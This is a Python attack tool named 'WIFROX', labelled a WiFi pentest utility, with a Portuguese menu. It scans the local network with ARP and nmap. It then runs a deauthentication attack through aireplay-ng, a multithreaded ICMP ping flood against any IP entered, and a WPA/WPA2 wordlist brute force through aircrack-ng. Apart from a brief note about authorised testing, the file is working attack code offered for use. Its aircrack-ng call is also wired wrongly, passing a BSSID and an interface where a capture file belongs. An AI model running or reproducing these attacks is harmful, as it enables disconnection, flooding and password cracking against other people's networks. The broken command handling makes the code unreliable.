import scapy.all as scapy
import requests
import netifaces
import nmap
import subprocess
import sys
import time
import threading
import logging
from datetime import datetime

# Configuração do log
logging.basicConfig(
    filename='wifrox.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

BANNER = r"""
__        __   _     _____  ____   __
\ \      / /__| |__ |___ / |___ \ / /_
 \ \ /\ / / _ \ '_ \  |_ \   __) | '_ \
  \ V  V /  __/ |_) |___) | / __/| (_) |
   \_/\_/ \___|_.__/|____/ |_____|_.__/

            WIFROX - Pentest WiFi Tool
"""

def log_and_print(msg):
    print(msg)
    logging.info(msg)

def get_default_interface():
    gateways = netifaces.gateways()
    default_iface = gateways['default'][netifaces.AF_INET][1]
    return default_iface

def get_ip_and_netmask(iface):
    addrs = netifaces.ifaddresses(iface)
    ip_info = addrs[netifaces.AF_INET][0]
    return ip_info['addr'], ip_info['netmask']

def ip_and_netmask_to_cidr(ip, netmask):
    bits = sum([bin(int(x)).count('1') for x in netmask.split('.')])
    ip_parts = ip.split('.')
    network = '.'.join(ip_parts[:3]) + '.1'
    return f"{network}/{bits}"

def get_mac_vendor(mac):
    try:
        response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except:
        return "Unknown"

def scan_os(ip):
    nm = nmap.PortScanner()
    try:
        nm.scan(ip, arguments='-O --osscan-guess')
        if ip in nm.all_hosts():
            osmatches = nm[ip].get('osmatch', [])
            if osmatches:
                return osmatches[0]['name']
        return "Desconhecido"
    except Exception:
        return "Erro na detecção"

def scan_network(ip_range):
    log_and_print(f"Escaneando rede {ip_range} com ARP...")
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        vendor = get_mac_vendor(mac)
        os_info = scan_os(ip)
        devices.append({
            "ip": ip,
            "mac": mac,
            "vendor": vendor,
            "os": os_info
        })
    log_and_print(f"{len(devices)} dispositivos encontrados.")
    return devices

def deauth_aireplay(target_mac, gateway_mac, iface, count=100):
    cmd = [
        "sudo", "aireplay-ng",
        "--deauth", str(count),
        "-a", gateway_mac,
        "-c", target_mac,
        iface
    ]
    log_and_print(f"Iniciando ataque de desautenticação: {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True)
        log_and_print("Ataque de desautenticação finalizado.")
    except subprocess.CalledProcessError as e:
        log_and_print(f"Erro no ataque de desautenticação: {e}")

def icmp_flood_worker(target_ip, count):
    packet = scapy.IP(dst=target_ip)/scapy.ICMP()
    for _ in range(count):
        scapy.send(packet, verbose=False)

def icmp_flood_multithread(target_ip, total_packets=10000, threads=10):
    log_and_print(f"Iniciando ataque ping flood com {threads} threads, total {total_packets} pacotes para {target_ip}")
    packets_per_thread = total_packets // threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=icmp_flood_worker, args=(target_ip, packets_per_thread))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    log_and_print("Ataque ping flood finalizado.")

def print_devices(devices):
    print(f"{'IP':15} {'MAC':20} {'Fabricante':25} {'Modelo/SO'}")
    print("-"*90)
    for d in devices:
        print(f"{d['ip']:15} {d['mac']:20} {d['vendor'][:24]:25} {d['os']}")

def get_gateway_mac(ip_range):
    gateway_ip = ip_range.split('/')[0]
    mac = scapy.getmacbyip(gateway_ip)
    return mac

def wpa_bruteforce(interface, capture_file, wordlist):
    log_and_print(f"Iniciando ataque de força bruta WPA/WPA2 com aircrack-ng")
    cmd = [
        "sudo", "aircrack-ng",
        "-w", wordlist,
        "-b", capture_file,
        interface
    ]
    log_and_print(f"Executando: {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True)
        log_and_print("Ataque de força bruta finalizado.")
    except subprocess.CalledProcessError as e:
        log_and_print(f"Erro no ataque de força bruta: {e}")

def main_menu():
    print(BANNER)
    iface = get_default_interface()
    ip, netmask = get_ip_and_netmask(iface)
    ip_range = ip_and_netmask_to_cidr(ip, netmask)
    log_and_print(f"Interface padrão detectada: {iface}")
    log_and_print(f"IP detectado: {ip}")
    log_and_print(f"Range para scan: {ip_range}")

    devices = []

    while True:
        print("\nMenu:")
        print("1 - Ver dispositivos na rede")
        print("2 - Ataque de desautenticação WiFi (deauth) com aireplay-ng")
        print("3 - Ataque de ping flood (ICMP spam) multithread")
        print("4 - Ataque de força bruta WPA/WPA2 (aircrack-ng)")
        print("5 - Como ativar modo monitor")
        print("6 - Sair")
        choice = input("Escolha uma opção: ").strip()

        if choice == '1':
            devices = scan_network(ip_range)
            if devices:
                print_devices(devices)
            else:
                log_and_print("Nenhum dispositivo encontrado.")

        elif choice == '2':
            if not devices:
                log_and_print("Faça o scan da rede primeiro (opção 1).")
                continue
            print_devices(devices)
            target_ip = input("Digite o IP do alvo para ataque de desautenticação: ").strip()
            target = next((d for d in devices if d['ip'] == target_ip), None)
            if not target:
                log_and_print("IP não encontrado na lista.")
                continue
            gateway_mac = get_gateway_mac(ip_range)
            if not gateway_mac:
                log_and_print("Não foi possível obter MAC do gateway.")
                continue
            print(f"Gateway MAC: {gateway_mac}")
            iface_mon = input("Digite a interface em modo monitor (ex: wlan0mon): ").strip()
            count = input("Número de pacotes de desautenticação (default 100): ").strip()
            count = int(count) if count.isdigit() else 100
            deauth_aireplay(target['mac'], gateway_mac, iface_mon, count)

        elif choice == '3':
            target_ip = input("Digite o IP do alvo para ping flood: ").strip()
            total_packets = input("Número total de pacotes (default 10000): ").strip()
            threads = input("Número de threads (default 10): ").strip()
            total_packets = int(total_packets) if total_packets.isdigit() else 10000
            threads = int(threads) if threads.isdigit() else 10
            icmp_flood_multithread(target_ip, total_packets, threads)

        elif choice == '4':
            iface_mon = input("Digite a interface em modo monitor (ex: wlan0mon): ").strip()
            capture_file = input("Digite o BSSID do alvo (MAC do roteador): ").strip()
            wordlist = input("Digite o caminho para o wordlist (ex: /usr/share/wordlists/rockyou.txt): ").strip()
            wpa_bruteforce(iface_mon, capture_file, wordlist)

        elif choice == '5':
            print_modo_monitor()

        elif choice == '6':
            log_and_print("Saindo...")
            sys.exit(0)
        else:
            print("Opção inválida. Tente novamente.")

def print_modo_monitor():
    print("""
Para ativar o modo monitor no Kali Linux:

1. Liste suas interfaces WiFi:
   sudo iw dev

2. Pare serviços que podem interferir:
   sudo airmon-ng check kill

3. Ative o modo monitor na interface WiFi (substitua wlan0 pelo nome da sua interface):
   sudo airmon-ng start wlan0

4. A interface em modo monitor geralmente será wlan0mon ou similar.

5. Para desativar o modo monitor e voltar ao modo gerenciado:
   sudo airmon-ng stop wlan0mon
   sudo service NetworkManager restart

**Importante:**  
- Use o modo monitor somente para testes autorizados.  
- O modo monitor permite capturar e injetar pacotes WiFi.

""")

if __name__ == "__main__":
    main_menu()
